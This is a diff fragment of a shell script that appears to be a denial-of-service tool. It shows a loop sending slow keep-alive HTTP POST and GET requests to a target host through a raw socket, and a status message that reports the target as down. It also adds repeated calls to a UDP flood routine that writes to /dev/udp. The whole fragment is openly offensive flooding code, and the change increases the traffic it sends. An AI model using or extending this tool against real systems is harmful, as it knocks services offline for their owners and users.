@@ -246,7 +246,7 @@ echo -e 'POST / HTTP/1.1\r\nContent-Type: application/json\r\nHost: $mIP\r\nAcce
 echo -ne "POST / HTTP/1.1\r\nHost: $mIP\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" >&3
 echo -e "GET / HTTP/1.1\r\nHost: $mIP\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n" >&3
 done
-printf "${Green}Target : $mip is Down${NC}"
+printf "${Green}Target : $mip might be Down${NC}\n"
 }
 
 
@@ -311,6 +311,8 @@ cat pkt/UDPH2
 
 uexec() {
 exec 1<>/dev/udp/$UIP/$uprt
+udpbot1 >&1
+udpbot1 >&1
 udpbot1 >&1
 }
 
